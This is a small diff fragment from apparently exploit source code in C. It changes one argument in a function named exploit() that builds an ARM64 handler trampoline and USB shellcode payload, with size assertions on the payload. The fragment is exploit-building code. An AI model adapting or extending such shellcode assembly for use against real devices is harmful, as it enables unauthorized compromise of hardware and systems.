@@ -58,7 +58,7 @@ int exploit() {
     v8_append(&handler, asm_arm64_x7_trampoline(payload_cfg.handle_interface_request));
     v8_push(&handler, asm_arm64_branch(0x10, 0x0));
     v8 usb_shellcode = prepare_shellcode("usb_0xA1_2_arm64", &payload_cfg.constants_usb);
-    v8_append(&handler, v8_range_of(&usb_shellcode, 4, 4));
+    v8_append(&handler, v8_range_of(&usb_shellcode, 4));
 
     assert(shellcode.size <= PAYLOAD_OFFSET_ARM64);
     assert(handler.size <= PAYLOAD_SIZE_ARM64);
